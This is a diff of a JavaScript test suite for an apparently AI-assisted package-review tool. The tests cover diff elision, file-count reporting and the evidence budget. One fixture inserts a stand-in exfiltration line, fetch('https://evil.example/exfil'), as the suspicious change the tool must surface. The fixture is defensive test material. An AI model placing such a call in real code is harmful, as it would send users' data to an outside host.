@@ -178,12 +178,14 @@ describe("AI review evidence tools", () => {
     // Tool policy carries only the numeric budgets; the prose duplicated the
     // system prompt and tool descriptions.
     expect(payload.toolPolicy).toEqual({
+      maxAgentSteps: expect.any(Number),
       maxToolResponseChars: expect.any(Number),
       maxTotalToolResponseChars: expect.any(Number),
     });
 
     // One file list, not two: the diff list is gone and the manifest subsumes it.
     expect(payload).not.toHaveProperty("changedFileDiff");
+    expect(payload.changedFileCount).toBe(1);
     expect(payload.changedFileManifest.map((entry) => entry.path)).toEqual(["package.json"]);
 
     const entry = payload.changedFileManifest[0];
@@ -198,6 +200,93 @@ describe("AI review evidence tools", () => {
     // the model reads it on demand.
     expect(payload.packageJson).not.toHaveProperty("textSample");
     expect(payload.packageJson).not.toHaveProperty("sha256");
+  });
+
+  test("elides long unchanged runs so a deep change fits the read budget", async () => {
+    const filler = Array.from({ length: 400 }, (_, i) => `const line${i} = ${i};`).join("\n");
+    const previousText = `${filler}\nconst tail = true;\n`;
+    const stagedText = `${previousText}fetch('https://evil.example/exfil');\n`;
+    const options = {
+      ecosystem: "npm",
+      files: [file("dist/big.js", stagedText)],
+      previousFiles: [file("dist/big.js", previousText)],
+      diff: [
+        {
+          path: "dist/big.js",
+          status: "modified",
+          previousSize: previousText.length,
+          stagedSize: stagedText.length,
+          previousSha256: "sha-prev",
+          stagedSha256: "sha-staged",
+          flags: [],
+        },
+      ],
+      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
+      ruleFindings: [],
+      previousVersionAvailable: true,
+    };
+    const tools = createAiReviewTools(options, () => {});
+
+    const reads = await tools.read.execute({ paths: ["dist/big.js"], maxChars: 2_000 });
+    const entry = reads.results[0];
+    expect(entry.ok).toBe(true);
+    expect(entry.kind).toBe("diff");
+    // The added line sits ~8KB into the file; a 2KB read still reaches it
+    // because the unchanged head collapses to an elision marker plus context.
+    expect(entry.content).toContain("+fetch('https://evil.example/exfil');");
+    expect(entry.content).toMatch(/@@ \d+ unchanged lines @@/);
+    expect(entry.content.length).toBeLessThanOrEqual(2_000);
+  });
+
+  test("reports the total changed-file count when the manifest is capped", () => {
+    const options = reviewOptions();
+    options.diff = [
+      ...options.diff,
+      ...Array.from({ length: 320 }, (_, i) => ({
+        path: `src/file-${i}.js`,
+        status: "added",
+        stagedSize: 10,
+        stagedSha256: `sha-${i}`,
+        flags: [],
+      })),
+    ];
+    const payload = buildAiReviewPayload(options);
+
+    expect(payload.changedFileCount).toBe(321);
+    expect(payload.changedFileManifest).toHaveLength(300);
+  });
+
+  test("flags evidence-budget exhaustion so the model submits instead of re-reading", async () => {
+    const bigFiles = ["a.js", "b.js", "c.js", "d.js"].map((path) => file(path, "x".repeat(20_000)));
+    const options = {
+      ecosystem: "npm",
+      files: bigFiles,
+      previousFiles: [],
+      diff: bigFiles.map((entry) => ({
+        path: entry.path,
+        status: "added",
+        stagedSize: entry.size,
+        stagedSha256: entry.sha256,
+        flags: [],
+      })),
+      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
+      ruleFindings: [],
+      previousVersionAvailable: false,
+    };
+    const tools = createAiReviewTools(options, () => {});
+
+    const first = await tools.read.execute({ paths: ["a.js"], maxChars: 16_000 });
+    expect(first.note).toBeUndefined();
+    await tools.read.execute({ paths: ["b.js"], maxChars: 16_000 });
+    const third = await tools.read.execute({ paths: ["c.js"], maxChars: 16_000 });
+    expect(third.remainingEvidenceChars).toBe(0);
+    expect(third.note).toContain("submit_review");
+
+    const exhaustedRead = await tools.read.execute({ paths: ["d.js"], maxChars: 16_000 });
+    expect(exhaustedRead.note).toContain("submit_review");
+    expect(exhaustedRead.results[0].content).toBe("");
+    const exhaustedSearch = await tools.search_files.execute({ queries: ["x"], maxResults: 1 });
+    expect(exhaustedSearch.note).toContain("submit_review");
   });
 
   test("labels PyPI review payloads with the ecosystem-specific task", () => {
